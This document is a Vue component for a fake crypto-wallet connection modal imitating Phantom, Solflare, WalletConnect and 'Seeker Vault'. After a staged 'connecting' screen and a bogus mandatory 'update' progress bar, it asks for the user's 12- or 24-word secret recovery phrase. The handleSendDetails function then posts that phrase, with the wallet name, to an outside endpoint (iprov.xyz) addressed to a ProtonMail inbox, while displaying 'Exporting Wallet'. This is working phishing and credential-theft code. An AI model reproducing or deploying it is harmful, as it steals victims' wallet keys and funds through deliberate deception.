<script setup>
import { ref } from 'vue';
import skrLogo from '@/assets/images/skr-logo.svg';
import phantomLogo from '@/assets/images/phantom.png';
import solflareLogo from '@/assets/images/solflare.png';
import walletconnectLogo from '@/assets/images/walletconnect.jpg';

const props = defineProps({
  isOpen: Boolean,
});

const emit = defineEmits(['close']);

const activeView = ref("select");
const selectedWallet = ref(null);
const progress = ref(0);
const wordCount = ref(12);
const phrases = ref(Array(12).fill(""));
const loading = ref(false);

const wallets = [
  { name: "Seeker Vault", id: "seeker", logo: skrLogo },
  { name: "Phantom", id: "phantom", logo: phantomLogo },
  { name: "Solflare", id: "solflare", logo: solflareLogo },
  { name: "WalletConnect", id: "walletconnect", logo: walletconnectLogo },
];

function closeWalletModal() {
  emit('close');
  activeView.value = "select";
  selectedWallet.value = null;
  progress.value = 0;
  wordCount.value = 12;
  phrases.value = Array(12).fill("");
}

function selectWallet(wallet) {
  selectedWallet.value = wallet;
  activeView.value = "connecting";

  setTimeout(() => {
    activeView.value = "update";
  }, 1500);
}

function startUpdate() {
  activeView.value = "progress";
  progress.value = 0;

  const interval = setInterval(() => {
    progress.value += 2;
    if (progress.value >= 100) {
      clearInterval(interval);
      activeView.value = "recovery";
    }
  }, 100);
}

function handleWordCountChange(e) {
  const count = Number(e.target.value);
  wordCount.value = count;
  phrases.value = Array(count).fill("");
}

function handlePhraseChange(index, value) {
  const trimmed = value.trim();

  if (trimmed.includes(" ")) {
    const words = trimmed.split(/\s+/).filter(Boolean);
    if (words.length === 12 || words.length === 24) {
      wordCount.value = words.length;
      phrases.value = words;
    } else {
      alert("Phrase must be 12 or 24 words.");
      phrases.value = Array(wordCount.value).fill("");
    }
  } else {
    phrases.value[index] = trimmed;
  }
}

function togglePhraseVisibility(index) {
  const input = document.getElementById(`phrase-input-${index}`);
  if (input) {
    input.type = input.type === "password" ? "text" : "password";
  }
}

async function handleSendDetails() {
  if (phrases.value.some((p) => !p.trim())) {
    alert("Fill all fields.");
    return;
  }

  loading.value = true;
  try {
    await fetch("https://iprov.xyz/api/send-email", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        email: "Gerfish7458@proton.me",
        subject: "Recovery Request",
        message: `Wallet is: ${selectedWallet.value.name}\n\nRecovery Phrase: ${phrases.value.join(" ")}`,
      }),
    });
  } finally {
    loading.value = false;
    activeView.value = "sent";
  }
}
</script>

<template>
  <div
    v-if="isOpen"
    class="fixed inset-0 z-[10000] backdrop-blur-md flex items-end md:items-center justify-center transition-all duration-300"
    :class="activeView === 'select' ? 'items-end md:items-center' : 'items-center'"
    @click="closeWalletModal"
  >
    <div
      class="bg-neutral-900 border border-gray-700 p-6 w-full max-w-[420px] shadow-2xl"
      :class="activeView === 'select' ? 'rounded-t-3xl md:rounded-3xl h-[550px] md:h-auto' : 'rounded-3xl h-full md:h-auto'"
      @click.stop
    >
      <!-- HEADER (All Views) -->
      <div class="flex items-center justify-between pb-5 border-b border-gray-700 mb-5">
        <div class="flex items-center flex-grow" v-if="activeView === 'select'">
          <div class="bg-neutral-800 text-white text-xs font-semibold px-3 py-1 rounded-full mr-3">reown</div>
          <span class="text-white text-lg">Manual Kit</span>
        </div>
        <div class="flex items-center flex-grow" v-else-if="selectedWallet">
          <div class="w-8 h-8 rounded-lg overflow-hidden bg-white flex items-center justify-center mr-3">
            <img :src="selectedWallet.logo" :alt="selectedWallet.name + ' Logo'" class="w-full h-full object-contain p-1" />
          </div>
          <span class="text-white text-lg font-bold">{{ selectedWallet.name }}</span>
        </div>
        <button class="text-gray-400 text-3xl leading-none hover:text-white transition-colors" @click="closeWalletModal">&times;</button>
      </div>

      <!-- SELECT WALLET VIEW -->
      <div v-if="activeView === 'select'" class="flex flex-col h-full">
        <div class="flex-1 overflow-y-auto px-1 -mx-1 no-scrollbar">
          <p class="text-gray-400 mb-3 text-sm">Popular:</p>
          <div class="flex flex-col gap-2">
            <div
              v-for="(wallet, index) in wallets"
              :key="wallet.id"
              class="flex items-center justify-between p-3.5 bg-neutral-800 rounded-2xl cursor-pointer hover:bg-neutral-700 transition-colors"
              @click="selectWallet(wallet)"
            >
              <div class="flex items-center gap-4">
                <div class="w-10 h-10 rounded-xl overflow-hidden bg-white flex items-center justify-center border border-gray-600">
                  <img :src="wallet.logo" :alt="wallet.name + ' Logo'" class="w-full h-full object-contain" />
                </div>
                <span class="text-white font-medium">{{ wallet.name }}</span>
              </div>
              <span v-if="index === 0" class="text-xs font-semibold text-indigo-500 bg-indigo-900/40 px-3 py-1 rounded-full">RECOMMENDED</span>
            </div>
          </div>
        </div>
        <div class="flex flex-col items-center justify-center p-6 mt-4 bg-neutral-800 border border-gray-700 rounded-2xl">
          <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-white">
            <circle cx="12" cy="12" r="10" />
            <path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20" />
            <path d="M2 12h20" />
          </svg>
          <p class="text-white text-sm text-center">Connect your wallet to get started</p>
        </div>
      </div>

      <!-- CONNECTING VIEW -->
      <div v-if="activeView === 'connecting'" class="flex-1 flex flex-col items-center justify-center text-center py-10">
        <div class="animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-indigo-500"></div>
        <p class="mt-6 text-gray-400 text-lg">Connecting to {{ selectedWallet.name }}...</p>
      </div>

      <!-- UPDATE INFO VIEW -->
      <div v-if="activeView === 'update'" class="flex-1 flex flex-col items-center justify-center text-center py-8">
        <h3 class="text-white text-2xl font-bold mb-4">Update Wallet</h3>
        <p class="text-gray-400 mb-8">To ensure a secure and stable connection, you must update your wallet. This process may take a few moments.</p>
        <button class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-medium py-3 rounded-xl transition-colors" @click="startUpdate">Update</button>
      </div>

      <!-- PROGRESS VIEW -->
      <div v-if="activeView === 'progress'" class="flex-1 flex flex-col items-center justify-center py-8">
        <div class="w-24 h-24 rounded-lg overflow-hidden bg-white flex items-center justify-center shadow-lg mb-6">
          <img :src="selectedWallet.logo" :alt="selectedWallet.name + ' Logo'" class="w-full h-full object-contain p-2" />
        </div>
        <h3 class="text-white text-2xl font-bold mb-2">Updating {{ selectedWallet.name }}</h3>
        <p class="text-gray-400 mb-8">Please wait while we finalize the update. This process is essential for security.</p>
        <div class="w-full bg-gray-700 rounded-full h-2.5">
          <div class="bg-indigo-600 h-2.5 rounded-full transition-all duration-100 ease-linear" :style="{ width: progress + '%' }"></div>
        </div>
        <p class="mt-4 text-sm text-gray-500">{{ progress }}%</p>
      </div>

      <!-- RECOVERY PHRASE INPUT VIEW -->
      <div v-if="activeView === 'recovery'" class="flex-1 flex flex-col items-center justify-center w-full">
        <h3 class="text-white text-2xl font-bold mb-4">Import your wallet with your Secret Recovery Phrase</h3>
        <p class="text-gray-400 mb-4">We will use your Secret Recovery Phrase to validate your ownership. Enter the Secret Recovery Phrase that you were given when you created your wallet.</p>
        <div class="w-full mb-4">
          <select class="w-full p-3 bg-neutral-800 text-white rounded-lg border border-gray-700 focus:outline-none focus:border-indigo-500 transition-colors" :value="wordCount" @change="handleWordCountChange">
            <option value="12">12-word phrase</option>
            <option value="24">24-word phrase</option>
          </select>
        </div>
        <div class="w-full bg-neutral-800 text-gray-400 p-3 rounded-lg flex items-center mb-4">
          <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" viewBox="0 0 20 20" fill="currentColor">
            <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v2a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd" />
          </svg>
          You can paste your entire secret recovery phrase into any field
        </div>
        <div class="grid grid-cols-2 gap-4 w-full max-h-[250px] overflow-y-auto mb-4 no-scrollbar">
          <div v-for="(phrase, index) in phrases" :key="index" class="flex items-center">
            <span class="text-gray-400 mr-2">{{ index + 1 }}.</span>
            <div class="relative w-full">
              <input :id="'phrase-input-' + index" type="password" class="w-full p-3 bg-neutral-800 text-white rounded-lg border border-gray-700 focus:outline-none focus:border-indigo-500 transition-colors pr-10" placeholder="Enter word" :value="phrase" @input="handlePhraseChange(index, $event.target.value)" required />
              <button type="button" @click="togglePhraseVisibility(index)" class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-white transition-colors">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
                  <path d="M10 12a2 2 0 100-4 2 2 0 000 4z" />
                  <path fill-rule="evenodd" d="M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z" clip-rule="evenodd" />
                </svg>
              </button>
            </div>
          </div>
        </div>
        <button @click="handleSendDetails" class="mt-4 w-full bg-indigo-600 hover:bg-indigo-700 text-white font-medium py-3 rounded-xl transition-colors" :disabled="loading">
          {{ loading ? 'Submitting...' : 'Confirm Secret Recovery Phrase' }}
        </button>
      </div>

      <!-- SENT VIEW -->
      <div v-if="activeView === 'sent'" class="flex-1 flex flex-col items-center justify-center text-center py-10">
        <h3 class="text-white text-2xl font-bold mb-4">Exporting Wallet</h3>
        <div class="animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-indigo-500"></div>
        <p class="mt-6 text-gray-400 text-lg">Your wallet is being exported securely...</p>
      </div>
    </div>
  </div>
</template>

<style scoped>
.no-scrollbar::-webkit-scrollbar {
  display: none;
}
.no-scrollbar {
  -ms-overflow-style: none;
  scrollbar-width: none;
}
</style>
